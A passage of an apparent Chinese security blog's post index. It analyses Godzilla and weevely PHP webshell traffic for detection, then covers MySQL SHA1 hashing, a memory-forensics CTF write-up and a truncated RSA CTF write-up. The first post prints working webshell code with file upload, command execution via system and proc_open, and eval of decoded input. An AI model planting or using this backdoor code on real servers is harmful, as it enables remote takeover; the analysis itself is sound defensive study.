if((is_dir($pf))&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123; deleteDir($pf); @rmdir($pf); &#125;else if (is_file($pf)&amp;&amp;($f!=&quot;.&quot;)&amp;&amp;($f!=&quot;..&quot;))&#123; @unlink($pf); &#125; &#125; $m-&gt;close(); @chmod($p,0777); return @rmdir($p);&#125;function deleteFile()&#123; $F=get(&quot;fileName&quot;); if(is_dir($F))&#123; return deleteDir($F)?&quot;ok&quot;:&quot;fail&quot;; &#125;else&#123; return (file_exists($F)?@unlink($F)?&quot;ok&quot;:&quot;fail&quot;:&quot;fail&quot;); &#125;&#125;function copyFile()&#123; $srcFileName=get(&quot;srcFileName&quot;); $destFileName=get(&quot;destFileName&quot;); if (@is_file($srcFileName))&#123; if (copy($srcFileName,$destFileName))&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125; &#125;else&#123; return &quot;The target does not exist or is not a file&quot;; &#125;&#125;function moveFile()&#123; $srcFileName=get(&quot;srcFileName&quot;); $destFileName=get(&quot;destFileName&quot;); if (rename($srcFileName,$destFileName))&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function getBasicsInfo()&#123; $data = array(); $data[&#x27;OsInfo&#x27;] = @php_uname(); $data[&#x27;CurrentUser&#x27;] = @get_current_user(); $data[&#x27;CurrentUser&#x27;] = strlen(trim($data[&#x27;CurrentUser&#x27;])) &gt; 0 ? $data[&#x27;CurrentUser&#x27;] : &#x27;NULL&#x27;; $data[&#x27;disable_functions&#x27;] = (@ini_get(&#x27;disable_functions&#x27;)); $data[&#x27;disable_functions&#x27;] = strlen(trim($data[&#x27;disable_functions&#x27;])) &gt; 0 ? $data[&#x27;disable_functions&#x27;] : @get_cfg_var(&#x27;disable_functions&#x27;); $data[&#x27;timezone&#x27;] = @ini_get(&#x27;date.timezone&#x27;); $data[&#x27;encode&#x27;] = @ini_get(&#x27;exif.encode_unicode&#x27;); $data[&#x27;extension_dir&#x27;] = @ini_get(&#x27;extension_dir&#x27;); $data[&#x27;include_path&#x27;] = @ini_get(&#x27;include_path&#x27;); $data[&#x27;PHP_SAPI&#x27;] = PHP_SAPI; $data[&#x27;PHP_VERSION&#x27;] = PHP_VERSION; $data[&#x27;memory_limit&#x27;] = ini_get(&#x27;memory_limit&#x27;); $data[&#x27;upload_max_filesize&#x27;] = ini_get(&#x27;upload_max_filesize&#x27;); $data[&#x27;post_max_size&#x27;] = ini_get(&#x27;post_max_size&#x27;); $data[&#x27;max_execution_time&#x27;] = ini_get(&#x27;max_execution_time&#x27;); $data[&#x27;max_input_time&#x27;] = ini_get(&#x27;max_input_time&#x27;); $data[&#x27;default_socket_timeout&#x27;] = ini_get(&#x27;default_socket_timeout&#x27;); $data[&#x27;mygid&#x27;] = @getmygid(); $data[&#x27;mypid&#x27;] = @getmypid(); $data[&#x27;SERVER_SOFTWAREypid&#x27;] = @$_SERVER[&#x27;SERVER_SOFTWARE&#x27;]; $data[&#x27;SERVER_PORT&#x27;] = @$_SERVER[&#x27;SERVER_PORT&#x27;]; $data[&#x27;loaded_extensions&#x27;] = @implode(&#x27;,&#x27;, @get_loaded_extensions()); $data[&#x27;short_open_tag&#x27;] = @get_cfg_var(&#x27;short_open_tag&#x27;); $data[&#x27;short_open_tag&#x27;] = @(int)$data[&#x27;short_open_tag&#x27;] == 1 ? &#x27;true&#x27; : &#x27;false&#x27;; $data[&#x27;asp_tags&#x27;] = @get_cfg_var(&#x27;asp_tags&#x27;); $data[&#x27;asp_tags&#x27;] = (int)$data[&#x27;asp_tags&#x27;] == 1 ? &#x27;true&#x27; : &#x27;false&#x27;; $data[&#x27;safe_mode&#x27;] = @get_cfg_var(&#x27;safe_mode&#x27;); $data[&#x27;safe_mode&#x27;] = (int)$data[&#x27;safe_mode&#x27;] == 1 ? &#x27;true&#x27; : &#x27;false&#x27;; $data[&#x27;CurrentDir&#x27;] = str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, @dirname($_SERVER[&#x27;SCRIPT_FILENAME&#x27;])); $data[&#x27;FileRoot&#x27;] = &#x27;&#x27;; if (substr(__FILE__, 0, 1) != &#x27;/&#x27;) &#123;foreach (range(&#x27;C&#x27;, &#x27;Z&#x27;) as $L)&#123; if (@is_dir(&quot;&#123;$L&#125;:&quot;))&#123; $data[&#x27;FileRoot&#x27;] .= &quot;&#123;$L&#125;:/;&quot;;&#125;&#125;;&#125;; $data[&#x27;FileRoot&#x27;] = (strlen(trim($data[&#x27;FileRoot&#x27;])) &gt; 0 ? $data[&#x27;FileRoot&#x27;] : &#x27;/&#x27;); $data[&#x27;FileRoot&#x27;]= substr_count($data[&#x27;FileRoot&#x27;],substr(__FILE__, 0, 1))&lt;=0?substr(__FILE__, 0, 1).&quot;:/&quot;:$data[&#x27;FileRoot&#x27;]; $result=&quot;&quot;; foreach($data as $key=&gt;$value)&#123; $result.=$key.&quot; : &quot;.$value.&quot;\\n&quot;; &#125; return $result;&#125;function getFile()&#123; $dir=get(&#x27;dirName&#x27;); $dir=(strlen(@trim($dir))&gt;0)?trim($dir):str_replace(&#x27;\\\\&#x27;,&#x27;/&#x27;,dirname(__FILE__)); $dir.=&quot;/&quot;; $path=$dir; $allFiles = @scandir($path); $data=&quot;&quot;; if ($allFiles!=null)&#123; $data.=&quot;ok&quot;; $data.=&quot;\\n&quot;; $data.=$path; $data.=&quot;\\n&quot;; foreach ($allFiles as $fileName) &#123; if ($fileName!=&quot;.&quot;&amp;&amp;$fileName!=&quot;..&quot;)&#123; $fullPath = $path.$fileName; $lineData=array(); array_push($lineData,$fileName); array_push($lineData,@is_file($fullPath)?&quot;1&quot;:&quot;0&quot;); array_push($lineData,date(&quot;Y-m-d H:i:s&quot;, @filemtime($fullPath))); array_push($lineData,@filesize($fullPath)); $fr=(@is_readable($fullPath)?&quot;R&quot;:&quot;&quot;).(@is_writable($fullPath)?&quot;W&quot;:&quot;&quot;).(@is_executable($fullPath)?&quot;X&quot;:&quot;&quot;); array_push($lineData,(strlen($fr)&gt;0?$fr:&quot;F&quot;)); $data.=(implode(&quot;\\t&quot;,$lineData).&quot;\\n&quot;); &#125; &#125; &#125;else&#123; return &quot;Path Not Found Or No Permission!&quot;; &#125; return $data;&#125;function readFileContent()&#123; $fileName=get(&quot;fileName&quot;); if (@is_file($fileName))&#123; if (@is_readable($fileName))&#123; return file_get_contents($fileName); &#125;else&#123; return &quot;No Permission!&quot;; &#125; &#125;else&#123; return &quot;File Not Found&quot;; &#125;&#125;function uploadFile()&#123; $fileName=get(&quot;fileName&quot;); $fileValue=get(&quot;fileValue&quot;); if (@file_put_contents($fileName,$fileValue)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function newDir()&#123; $dir=get(&quot;dirName&quot;); if (@mkdir($dir,0777,true)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function newFile()&#123; $fileName=get(&quot;fileName&quot;); if (@file_put_contents($fileName,&quot;&quot;)!==false)&#123; return &quot;ok&quot;; &#125;else&#123; return &quot;fail&quot;; &#125;&#125;function execCommand()&#123; $result = &quot;&quot;; $command = get(&quot;cmdLine&quot;); $PadtJn = @ini_get(&#x27;disable_functions&#x27;); if (! empty($PadtJn)) &#123; $PadtJn = preg_replace(&#x27;/[, ]+/&#x27;, &#x27;,&#x27;, $PadtJn); $PadtJn = explode(&#x27;,&#x27;, $PadtJn); $PadtJn = array_map(&#x27;trim&#x27;, $PadtJn); &#125; else &#123; $PadtJn = array(); &#125; if (FALSE !== strpos(strtolower(PHP_OS), &#x27;win&#x27;)) &#123; $command = $command . &quot; 2&gt;&amp;1\\n&quot;; &#125; if (is_callable(&#x27;system&#x27;) and ! in_array(&#x27;system&#x27;, $PadtJn)) &#123; ob_start(); system($command); $result = ob_get_contents(); ob_end_clean(); &#125; else if (is_callable(&#x27;proc_open&#x27;) and ! in_array(&#x27;proc_open&#x27;, $PadtJn)) &#123; $handle = proc_open($command, array(array(&#x27;pipe&#x27;,&#x27;r&#x27;),array(&#x27;pipe&#x27;,&#x27;w&#x27;),array(&#x27;pipe&#x27;,&#x27;w&#x27;)),$pipes); $result = NULL; while (! feof($pipes[1])) &#123; $result .= fread($pipes[1], 1024); &#125; @proc_close($handle); &#125; else if (is_callable(&#x27;passthru&#x27;) and ! in_array(&#x27;passthru&#x27;, $PadtJn)) &#123; ob_start(); passthru($command); $result = ob_get_contents(); ob_end_clean(); &#125; else if (is_callable(&#x27;shell_exec&#x27;) and ! in_array(&#x27;shell_exec&#x27;, $PadtJn)) &#123; $result = shell_exec($command); &#125; else if (is_callable(&#x27;exec&#x27;) and ! in_array(&#x27;exec&#x27;, $PadtJn)) &#123; $result = array(); exec($command, $result); $result = join(chr(10), $result) . chr(10); &#125; else if (is_callable(&#x27;exec&#x27;) and ! in_array(&#x27;popen&#x27;, $PadtJn)) &#123; $fp = popen($command, &#x27;r&#x27;); $result = NULL; if (is_resource($fp)) &#123; while (! feof($fp)) &#123; $result .= fread($fp, 1024); &#125; &#125; @pclose($fp); &#125; else &#123; return &quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;; &#125; return $result;&#125;function execSql()&#123; $dbType=get(&quot;dbType&quot;); $dbHost=get(&quot;dbHost&quot;); $dbPort=get(&quot;dbPort&quot;); $username=get(&quot;dbUsername&quot;); $password=get(&quot;dbPassword&quot;); $execType=get(&quot;execType&quot;); $execSql=get(&quot;execSql&quot;); function mysql_exec($host,$port,$username,$password,$execType,$sql)&#123; // 创建连接 $conn = new mysqli($host,$username,$password,&quot;&quot;,$port); // Check connection if ($conn-&gt;connect_error) &#123; return $conn-&gt;connect_error; &#125; $result = $conn-&gt;query($sql); if ($conn-&gt;error)&#123; return $conn-&gt;error; &#125; $result = $conn-&gt;query($sql); if ($execType==&quot;update&quot;)&#123; return &quot;Query OK, &quot;+$conn-&gt;affected_rows+&quot; rows affected&quot;; &#125;else&#123; $data=&quot;ok\\n&quot;; while ($column = $result-&gt;fetch_field())&#123; $data.=base64_encode($column-&gt;name).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; if ($result-&gt;num_rows &gt; 0) &#123; // 输出数据 while($row = $result-&gt;fetch_assoc()) &#123; foreach ($row as $value)&#123; $data.=base64_encode($value).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; &#125; &#125; return $data; &#125; &#125; function pdoExec($databaseType,$host,$port,$username,$password,$execType,$sql)&#123; try &#123; $conn = new PDO(&quot;&#123;$databaseType&#125;:host=$host;port=&#123;$port&#125;;&quot;, $username, $password); // 设置 PDO 错误模式为异常 $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); if ($execType==&quot;update&quot;)&#123; return &quot;Query OK, &quot;+$conn-&gt;exec($sql)+&quot; rows affected&quot;; &#125;else&#123; $data=&quot;ok\\n&quot;; $stm=$conn-&gt;prepare($sql); $stm-&gt;execute(); $row=$stm-&gt;fetch(PDO::FETCH_ASSOC); $_row=&quot;\\n&quot;; foreach (array_keys($row) as $key)&#123; $data.=base64_encode($key).&quot;\\t&quot;; $_row.=base64_encode($row[$key]).&quot;\\t&quot;; &#125; $data.=$_row.&quot;\\n&quot;; while ($row=$stm-&gt;fetch(PDO::FETCH_ASSOC))&#123; foreach (array_keys($row) as $key)&#123; $data.=base64_encode($row[$key]).&quot;\\t&quot;; &#125; $data.=&quot;\\n&quot;; &#125; return $data; &#125; &#125; catch(PDOException $e) &#123; return $e-&gt;getMessage(); &#125; &#125; if ($dbType==&quot;mysql&quot;)&#123; if (extension_loaded(&quot;mysqli&quot;))&#123; return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else if (extension_loaded(&quot;pdo&quot;))&#123; return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else&#123; return &quot;no extension&quot;; &#125; &#125;else if (extension_loaded(&quot;pdo&quot;))&#123; return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$execSql); &#125;else&#123; return &quot;no extension&quot;; &#125; return &quot;no extension&quot;;&#125;function base64Encode($data)&#123; return base64_encode($data);&#125;function test()&#123; return &quot;ok&quot;;&#125;function get($key)&#123; global $parameters; if (isset($parameters[$key]))&#123; return $parameters[$key]; &#125;else&#123; return null; &#125;&#125;function includeCode()&#123; @session_start(); $classCode=get(&quot;binCode&quot;); $codeName=get(&quot;codeName&quot;); $_SESSION[$codeName]=$classCode; @session_write_close(); return &quot;ok&quot;;&#125;function base64Decode($string)&#123; return base64_decode($string);&#125; 123456789101112cat /var/lib/php/sessions/sess_2fd4crdp3abn29ml2frbh5o7kspayload|s:12974:&quot;$parameters=array();function run($pms)&#123; formatParameter($pms.&#x27;&amp;ILikeYou=&#x27;.base64Encode(&#x27;metoo&#x27;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125; 之后客户端只需要发送函数名即可 123pass&#x3D;A2FhAQJxDwoxCyMVa2YFXjMHbQc5c3NYNTdYXA&#x3D;&#x3D;# methodName&#x3D;dGVzdA&#x3D;&#x3D;# test 响应内容为 [0-9a-f]&#123;16&#125;[a-zA-Z0-9\\+/=]+[0-9a-f]&#123;16&#125; 如c23b1cfc51d5ff57AwREDA==36d66d61379e05ae 且前后的Hex值为一个固定的md5值 参数特征 无 流量特征 POST数据中有大量的Base64编码内容（针对初始化过程） 响应内容：[0-9a-f]&#123;16&#125;[a-zA-Z0-9\\+/=]+[0-9a-f]&#123;16&#125; 其他 由于哥斯拉的函数存储于session之中，那么就可以尝试从session文件的内容检测入手 文件内容 123456789101112cat /var/lib/php/sessions/sess_2fd4crdp3abn29ml2frbh5o7kspayload|s:12974:&quot;$parameters=array();function run($pms)&#123; formatParameter($pms.&#x27;&amp;ILikeYou=&#x27;.base64Encode(&#x27;metoo&#x27;)); if ($_SESSION[&quot;bypass_open_basedir&quot;]==true)&#123; @bypass_open_basedir(); &#125; return base64Encode(evalFunc());&#125; 文件大小 12ls -la &#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_2fd4crdp3abn29ml2frbh5o7ks -rw------- 1 www-data www-data 12993 Mar 16 18:22 &#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_2fd4crdp3abn29ml2frbh5o7ks weevely php后门 反混淆的结果如下 12345678910111213141516171819202122232425262728$k=&quot;1a1dc91c&quot;;$kh=&quot;907325c69271&quot;;$kf=&quot;ddf0c944bc72&quot;;$p=&quot;flb0xixOqB7g8Ds&quot;;function x($t,$k)&#123; $c=strlen($k); $l=strlen($t); $o=&quot;&quot;; for($i=0;$i&lt;$l;) &#123; for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123; $o.=$t&#123;$i&#125;^$k&#123;$j&#125;; &#125; &#125; return $o;&#125;if (@preg_match(&quot;/$kh(.+)$kf/&quot;,@file_get_contents(&quot;php://input&quot;),$m)==1)&#123; @ob_start(); @eval(@gzuncompress(@x(@base64_decode($m[1]),$k))); $o=@ob_get_contents(); @ob_end_clean(); $r=@base64_encode(@x(@gzcompress($o),$k)); print(&quot;$p$kh$r$kf&quot;);&#125; 可以看到weevely所使用的加密方法为 Base64+XOR+Zlib 1234567891011121314#coding: utf-8import base64import binasciiimport zlibkey = &quot;1a1dc91c&quot;post = b&quot;Sf16qivwHbFhth4vT+seTB62/kyq9GC0hRd5SUnzHukeKxysTBP4r3q2AWTpLGZ1psXXDstel0spuJh9YawwY4DyJcM=&quot;post = base64.b64decode(post).decode(&quot;ISO-8859-1&quot;)b64 = b&quot;&quot;for _ in range(len(post)): b64 += chr(ord(post[_])^ord(key[_%len(key)])).encode(&quot;ISO-8859-1&quot;)print(zlib.decompress(b64))# b&quot;chdir(&#x27;/var/www/html&#x27;);@error_reporting(0);@system(&#x27;id 2&gt;&amp;1&#x27;);&quot; php的一些压缩函数以及参数与压缩算法的对应关系 gzencode() gzdecode() ZLIB_ENCODING_GZIP -&gt; gzip gzcompress() gzuncompress() ZLIB_ENCODING_DEFLATE -&gt; zlib gzdeflate() gzinflate() ZLIB_ENCODING_RAW -&gt; deflate 参数特征 无参数 流量特征 客户端发送流量格式 scramble1+[0-9a-f]&#123;12&#125;[a-zA-Z0-9\\+/=]*?[0-9a-f]&#123;12&#125;+scramble2 且前后两段12字节Hex值分别为$kh和$kf 服务端响应流量格式为 scramble+[0-9a-f]&#123;12&#125;[a-zA-Z0-9\\+/=]*?[0-9a-f]&#123;12&#125; 且scramble为$p，前后两段12字节Hex值分别为$kh和$kf","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Traffic_Analysis","slug":"Traffic-Analysis","permalink":"https://yoloyolo.top/tags/Traffic-Analysis/"},{"name":"WebShell","slug":"WebShell","permalink":"https://yoloyolo.top/tags/WebShell/"}]},{"title":"MysqlSha1","slug":"MysqlSha1","date":"2021-03-11T22:46:37.000Z","updated":"2022-06-27T18:27:48.000Z","comments":true,"path":"2021/03/11/MysqlSha1/","link":"","permalink":"https://yoloyolo.top/2021/03/11/MysqlSha1/","excerpt":"在4.0版本之前，Mysql使用Mysql323作为Hash存储的方式 在4.1版本之后，Mysql使用MysqlSha1作为Hash存储的方式","text":"在4.0版本之前，Mysql使用Mysql323作为Hash存储的方式 在4.1版本之后，Mysql使用MysqlSha1作为Hash存储的方式 Generator MysqlSha1是基于Sha1的Hash算法，Hash前的星号用于标识以区别于Mysql323 123456def password(passwd): import hashlib _hash = hashlib.sha1(passwd.encode()).digest() __hash = &quot;*&quot; + hashlib.sha1(_hash).hexdigest().upper() return __hashprint(password(&quot;password&quot;)) 值得一提的是第一次Hash结果为二进制 Token mysql_native_password认证方式下的token生成 12345678def token(passwd, scramble): import hashlib hash1 = hashlib.sha1(passwd.encode()).digest() hash2 = hashlib.sha1(passwd.encode()).hexdigest() hash3 = hashlib.sha1(scramble.encode() + hashlib.sha1(hash1).digest()).hexdigest() token = hex(int(hash2, 16) ^ int(hash3, 16))[2:] return tokenprint(token(&quot;password&quot;, &quot;&#123;?hmkQ3Lb*Ipz3.**1WC&quot;)) Check mysql_native_password认证方式下的check方法 12345678910def check(token, __hash, scramble): import binascii import hashlib _hash1 = hashlib.sha1(binascii.unhexlify(hex(int(token, 16) ^ int(hashlib.sha1(scramble.encode() + binascii.unhexlify(__hash[1:].lower().encode())).hexdigest(), 16))[2:].encode())).hexdigest() _hash2 = __hash[1:].lower() if _hash1 == _hash2: return True else: return Falseprint(check(&quot;7230ae6e07d2b83f36aca145169248fbcd80b7a4&quot;, &quot;*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19&quot;, &quot;&#123;?hmkQ3Lb*Ipz3.**1WC&quot;)) 在显示的时候Hash都为Hex形式，计算的时候都为Bin形式，在处理的时候需要注意 在网上查阅资料的时候基本没有见过有文章提到Hash计算的时候为二进制，直接治好了我的低血压","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"Hash","slug":"Hash","permalink":"https://yoloyolo.top/tags/Hash/"},{"name":"Mysql","slug":"Mysql","permalink":"https://yoloyolo.top/tags/Mysql/"}]},{"title":"内存取证","slug":"Memory_Forensics","date":"2021-01-28T12:04:23.000Z","updated":"2022-06-27T18:42:38.000Z","comments":true,"path":"2021/01/28/Memory_Forensics/","link":"","permalink":"https://yoloyolo.top/2021/01/28/Memory_Forensics/","excerpt":"前两天刚打的ShadowCTF，遇到了一些内存取证的题目，这里做一些记录 Pwn题出得太棒了","text":"前两天刚打的ShadowCTF，遇到了一些内存取证的题目，这里做一些记录 Pwn题出得太棒了 首先是一个系列的内存取证 Suspicious Riddle The Riddler has infected batman’s PC with some suspicious programs. Find the PID of the suspicious program. 要求找到可疑进程的PID 1volatility -f shadow.raw imageinfo 查看内存镜像的信息，这里会给出可能的操作系统版本，这个对于后续的工作是很重要的 1234567891011121314Volatility Foundation Volatility Framework 2.6INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418 AS Layer1 : WindowsAMD64PagedMemory (Kernel AS) AS Layer2 : FileAddressSpace (&#x2F;root&#x2F;shadow.raw) PAE type : No PAE DTB : 0x187000L KDBG : 0xf80002a050a0L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0xfffff80002a06d00L KUSER_SHARED_DATA : 0xfffff78000000000L Image date and time : 2021-01-20 21:08:55 UTC+0000 Image local date and time : 2021-01-21 01:08:55 +0400 可以看到可能的操作系统有很多，一个一个地尝试，接下来查看当时正在运行的进程 1volatility -f shadow.raw --profile&#x3D;Win7SP1x64 psscan 这里指定的系统版本为Win7SP1x64，可以看到psscan的扫描结果，就说明操作系统基本就是Win7SP1x64了 如果指定的系统版本出入很大的话，psscan是没有扫描结果的 10x0000000033147630 riddle.exe 2816 1764 0x00000000178ee000 2021-01-20 21:08:24 UTC+0000 这里可以看到一个riddle.exe，PID为2816 那么就解出了第一个题 ShadowCTF{2816} Hash Riddle Batman needs to identify what the executable is doing. Find the md5 hash of the suspicious program. Use the same raw image as Suspicious Riddle Challenge 这里要求我们找出可疑程序的md5值 那么就需要把程序导出，再计算md5值 错误解法 看我filescan找出可执行文件再导出就完事了 12345volatility -f shadow.raw --profile&#x3D;Win7SP1x64 filescan | grep riddle.exe 0x0000000030e18dc0 2 0 R--r-d \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\riddle.exe0x0000000030e44f20 15 0 R--r-d \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\riddle.exe0x000000003315aa90 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\riddle.exe wc？怎么有三个？不管了，直接dumpfiles，一个个算md5交flag就完事了 12345678volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000030e18dc0 -D ~&#x2F;test&#x2F;volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000030e44f20 -D ~&#x2F;test&#x2F;volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x000000003315aa90 -D ~&#x2F;test&#x2F;md5sum ~&#x2F;test&#x2F;* b05e889e8436ed89157a2aa0cb8cdaa6 file.None.0xfffffa8000b5b2b0.datb8e7f5ac3579fba5a59d3eebfda80194 file.None.0xfffffa8002869280.imgc699187e1f235cb919c3bd602e99a452 file.None.0xfffffa8002c07bd0.dat ShadowCTF{b05e889e8436ed89157a2aa0cb8cdaa6} 错误 ShadowCTF{b8e7f5ac3579fba5a59d3eebfda80194} 错误 ShadowCTF{c699187e1f235cb919c3bd602e99a452} 错误 到这里人都懵了，尝试过对文件使用foremost，但是解出的exe文件还是错误的 正确解法 1volatility -f shadow.raw --profile&#x3D;Win7SP1x64 procdump -p 2816 -D ~&#x2F;test&#x2F; 将进程导出可执行文件 12md5sum ~&#x2F;test&#x2F;executable.2816.exeb4ef3e812db14a363f51efa379729715 &#x2F;root&#x2F;test&#x2F;executable.2816.exe ShadowCTF{b4ef3e812db14a363f51efa379729715} Source Riddle You found the suspicious executable, but how did it get there? His butler Alfred might have explored some malicious link. Find the source of the malware. 这里说是浏览某些危险链接下载的程序，找出链接 123456789volatility -f shadow.raw --profile&#x3D;Win7SP1x64 iehistory Process: 316 iexplore.exeCache type &quot;URL &quot; at 0x27c5900Record length: 0x100Location: :2021012120210122: batman@:Host: y0u-f0und-th3-s0urc3.herokuapp.comLast modified: 2021-01-21 01:08:05 UTC+0000Last accessed: 2021-01-20 21:08:05 UTC+0000File Offset: 0x100, Data Offset: 0x0, Data Length: 0x0 找到了这样一条记录 ShadowCTF{y0u-f0und-th3-s0urc3} Anarchy Riddle Look into the suspicious executable. What is the riddler trying to do? 这里问进程在干嘛 首先用排除法，肯定不是在挖矿 先看看有哪些文件，然后再去看用户和注册表啥的，大概是这个思路 123volatility -f shadow.raw --profile&#x3D;Win7SP1x64 filescan | grep batman 0x0000000031729380 16 0 R--rwd \\Device\\HarddiskVolume1\\Users\\batman\\Desktop\\meta_dense.png 这里看到了桌面上有个图片，可以导出看看 1volatility -f shadow.raw --profile&#x3D;Win7SP1x64 dumpfiles -Q 0x0000000031729380 -D ~&#x2F;test&#x2F; 可以看到一个中心被扭曲的图片，上面写着flag，ps一下就能看清楚flag了 ShadowCTF{P3nult1m4t3_R1ddl3_S0lv3d} 最后一个给了一个莫名其妙的字符串，basecrack解不出来，懒得做了 另外还有一个内存取证的题，是Win10X64的系统，Volatility2的一些模块在处理Win10系统时会报错，用Volatility3就行，然后一些模块的用法可能和Vol2有出入 这个题导出一个只有一半的flag的图片，试了一下常规隐写没有发现，也懒得再慢慢弄了","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://yoloyolo.top/tags/Misc/"},{"name":"Memory_Forensics","slug":"Memory-Forensics","permalink":"https://yoloyolo.top/tags/Memory-Forensics/"}]},{"title":"RSA题解记录","slug":"RSA-0","date":"2021-01-21T11:13:23.000Z","updated":"2021-03-10T07:01:31.000Z","comments":true,"path":"2021/01/21/RSA-0/","link":"","permalink":"https://yoloyolo.top/2021/01/21/RSA-0/","excerpt":"RSA &amp; CRT Discrete Log Polynomial Ring ECC","text":"RSA &amp; CRT Discrete Log Polynomial Ring ECC [De1CTF2019]babyrsa 1234567891011121314151617181920212223242526272829303132import binasciifrom data import e1,e2,p,q1p,q1q,hint,flag n = [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423L, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421L, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303L, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791L]c = [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569L, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031L, 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446L, 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797L]f=lambda m,e,n,c:pow(m,e,n)==cassert(sum(map(f,[p]*4,[4]*4,n,c))==4) ee1 = 42ee2 = 3ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384ce2 